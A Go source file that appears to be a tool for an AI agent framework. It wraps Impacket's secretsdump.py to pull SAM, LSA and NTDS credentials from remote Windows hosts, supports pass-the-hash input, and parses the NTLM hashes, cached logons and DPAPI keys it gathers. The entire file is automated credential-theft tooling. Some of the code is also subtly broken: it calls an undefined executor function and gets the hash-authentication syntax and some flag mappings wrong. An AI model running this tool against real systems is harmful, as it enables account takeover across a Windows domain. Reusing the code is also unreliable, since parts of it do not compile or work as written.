package main

import (
	"context"
	"fmt"
	"regexp"
	"strconv"
	"strings"

	sdkinput "github.com/zero-day-ai/sdk/input"
	"github.com/zero-day-ai/sdk/toolerr"
	"github.com/zero-day-ai/sdk/exec"
	"github.com/zero-day-ai/sdk/health"
	"github.com/zero-day-ai/sdk/tool"
	"github.com/zero-day-ai/sdk/types"
)

const (
	ToolName        = "secretsdump"
	ToolVersion     = "1.0.0"
	ToolDescription = "Dumps credentials from Windows systems using Impacket's secretsdump.py (SAM, LSA, NTDS)"
	BinaryName      = "secretsdump.py"
)

// ToolImpl implements the secretsdump tool
type ToolImpl struct{}

// NewTool creates a new secretsdump tool instance
func NewTool() tool.Tool {
	cfg := tool.NewConfig().
		SetName(ToolName).
		SetVersion(ToolVersion).
		SetDescription(ToolDescription).
		SetTags([]string{
			"credential-access",
			"windows",
			"active-directory",
			"impacket",
			"T1003.002", // OS Credential Dumping: Security Account Manager
			"T1003.003", // OS Credential Dumping: NTDS
		}).
		SetInputSchema(InputSchema()).
		SetOutputSchema(OutputSchema()).
		SetExecuteFunc((&ToolImpl{}).Execute)

	t, _ := tool.New(cfg)
	return &toolWithHealth{Tool: t, impl: &ToolImpl{}}
}

// toolWithHealth wraps the tool to add custom health checks
type toolWithHealth struct {
	tool.Tool
	impl *ToolImpl
}

func (t *toolWithHealth) Health(ctx context.Context) types.HealthStatus {
	return t.impl.Health(ctx)
}

// Execute runs secretsdump with the provided parameters
func (t *ToolImpl) Execute(ctx context.Context, input map[string]any) (map[string]any, error) {
	// Extract input parameters
	target := sdkinput.GetString(input, "target", "")
	domain := sdkinput.GetString(input, "domain", "")
	username := sdkinput.GetString(input, "username", "")
	password := sdkinput.GetString(input, "password", "")
	hash := sdkinput.GetString(input, "hash", "")
	method := sdkinput.GetString(input, "method", "")

	// Build authentication string
	authStr := buildAuthString(domain, username, password, hash)

	// Build command arguments
	args := []string{BinaryName}

	// Add method-specific flags
	if method != "" {
		switch method {
		case "sam":
			args = append(args, "-sam")
		case "lsa":
			args = append(args, "-security")
		case "ntds":
			args = append(args, "-ntds")
		}
	}

	// Add authentication and target
	args = append(args, fmt.Sprintf("%s@%s", authStr, target))

	// Execute secretsdump.py via python3
	timeout := sdkinput.GetTimeout(input, "timeout", sdkinput.DefaultTimeout())
	result, err := exec.Run(ctx, exec.Config{
		Command: "python3",
		Args:    args,
		Timeout: timeout,
	})

	if err != nil {
		return nil, toolerr.New(ToolName, "execute", toolerr.ErrCodeExecutionFailed, err.Error()).
			WithCause(err).
			WithDetails(map[string]any{
				"exit_code": result.ExitCode,
				"stderr":    string(result.Stderr),
			})
	}

	// Parse output
	output, parseErr := parseSecretsDumpOutput(result.Stdout)
	if parseErr != nil {
		return nil, toolerr.New(ToolName, "parse", toolerr.ErrCodeParseError, parseErr.Error()).
			WithCause(parseErr)
	}

	return output, nil
}

// Health checks if secretsdump.py is available
func (t *ToolImpl) Health(ctx context.Context) types.HealthStatus {
	// Check if python3 is available
	pythonCheck := health.BinaryCheck("python3")
	if !pythonCheck.IsHealthy() {
		return pythonCheck
	}

	// Check if secretsdump.py is available
	// Try to find it in PATH or common locations
	if executor.BinaryExists("secretsdump.py") {
		return types.NewHealthyStatus("secretsdump.py is available")
	}

	// Try to import impacket module
	result, err := exec.Run(ctx, exec.Config{
		Command: "python3",
		Args:    []string{"-c", "import impacket.examples.secretsdump"},
		Timeout: 5,
	})

	if err == nil && result.ExitCode == 0 {
		return types.NewHealthyStatus("Impacket module is available")
	}

	return types.NewUnhealthyStatus("secretsdump.py not found (install Impacket)", nil)
}

// buildAuthString builds the authentication string for secretsdump
func buildAuthString(domain, username, password, hash string) string {
	authStr := username
	if domain != "" {
		authStr = domain + "/" + username
	}

	if hash != "" {
		// Use hash authentication (pass-the-hash)
		authStr = authStr + "@" + hash
	} else if password != "" {
		// Use password authentication
		authStr = authStr + ":" + password
	}

	return authStr
}

// parseSecretsDumpOutput parses the output from secretsdump.py
func parseSecretsDumpOutput(data []byte) (map[string]any, error) {
	output := map[string]any{
		"domain_users":       []map[string]any{},
		"machine_accounts":   []map[string]any{},
		"cached_credentials": []map[string]any{},
		"dpapi_keys":         []map[string]any{},
	}

	// Parse domain user hashes
	// Format: [*] Dumping Domain Credentials (domain\username)
	// Format: username:RID:LMhash:NThash:::
	domainUserPattern := `^(?P<username>[^:$]+):(?P<rid>\d+):(?P<lm_hash>[a-fA-F0-9]{32}):(?P<nt_hash>[a-fA-F0-9]{32}):::`

	// Parse machine accounts (ending with $)
	machineAccountPattern := `^(?P<username>[^:]+\$):\d+:(?P<lm_hash>[a-fA-F0-9]{32}):(?P<nt_hash>[a-fA-F0-9]{32}):::`

	// Parse cached credentials
	// Format: [*] Dumping cached domain logon information (domain/username)
	cachedCredPattern := `^\[CACHED\]\s+(?P<username>[^:]+):(?P<hash>.+)$`

	// Parse DPAPI keys
	dpapiPattern := `^\[DPAPI\]\s+(?P<username>[^:]+):(?P<key>.+)$`

	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		// Try to match machine account first (more specific)
		if matched, _ := regexp.MatchString(machineAccountPattern, line); matched {
			if entry := extractMachineAccount(line); entry != nil {
				machineAccounts := output["machine_accounts"].([]map[string]any)
				output["machine_accounts"] = append(machineAccounts, entry)
			}
			continue
		}

		// Try to match domain user
		if matched, _ := regexp.MatchString(domainUserPattern, line); matched {
			if entry := extractDomainUser(line); entry != nil {
				domainUsers := output["domain_users"].([]map[string]any)
				output["domain_users"] = append(domainUsers, entry)
			}
			continue
		}

		// Try to match cached credentials
		if matched, _ := regexp.MatchString(cachedCredPattern, line); matched {
			if entry := extractCachedCredential(line); entry != nil {
				cachedCreds := output["cached_credentials"].([]map[string]any)
				output["cached_credentials"] = append(cachedCreds, entry)
			}
			continue
		}

		// Try to match DPAPI keys
		if matched, _ := regexp.MatchString(dpapiPattern, line); matched {
			if entry := extractDPAPIKey(line); entry != nil {
				dpapiKeys := output["dpapi_keys"].([]map[string]any)
				output["dpapi_keys"] = append(dpapiKeys, entry)
			}
			continue
		}
	}

	return output, nil
}

// extractDomainUser extracts domain user information from a line
func extractDomainUser(line string) map[string]any {
	re := regexp.MustCompile(`^(?P<username>[^:$]+):(?P<rid>\d+):(?P<lm_hash>[a-fA-F0-9]{32}):(?P<nt_hash>[a-fA-F0-9]{32}):::`)
	matches := re.FindStringSubmatch(line)

	if len(matches) == 0 {
		return nil
	}

	rid, _ := strconv.Atoi(matches[2])

	return map[string]any{
		"username": matches[1],
		"rid":      rid,
		"lm_hash":  matches[3],
		"nt_hash":  matches[4],
	}
}

// extractMachineAccount extracts machine account information from a line
func extractMachineAccount(line string) map[string]any {
	re := regexp.MustCompile(`^(?P<username>[^:]+\$):\d+:(?P<lm_hash>[a-fA-F0-9]{32}):(?P<nt_hash>[a-fA-F0-9]{32}):::`)
	matches := re.FindStringSubmatch(line)

	if len(matches) == 0 {
		return nil
	}

	return map[string]any{
		"username": matches[1],
		"lm_hash":  matches[2],
		"nt_hash":  matches[3],
	}
}

// extractCachedCredential extracts cached credential information from a line
func extractCachedCredential(line string) map[string]any {
	re := regexp.MustCompile(`^\[CACHED\]\s+(?P<username>[^:]+):(?P<hash>.+)$`)
	matches := re.FindStringSubmatch(line)

	if len(matches) == 0 {
		return nil
	}

	return map[string]any{
		"username": matches[1],
		"hash":     strings.TrimSpace(matches[2]),
	}
}

// extractDPAPIKey extracts DPAPI key information from a line
func extractDPAPIKey(line string) map[string]any {
	re := regexp.MustCompile(`^\[DPAPI\]\s+(?P<username>[^:]+):(?P<key>.+)$`)
	matches := re.FindStringSubmatch(line)

	if len(matches) == 0 {
		return nil
	}

	return map[string]any{
		"username": matches[1],
		"key":      strings.TrimSpace(matches[2]),
	}
}
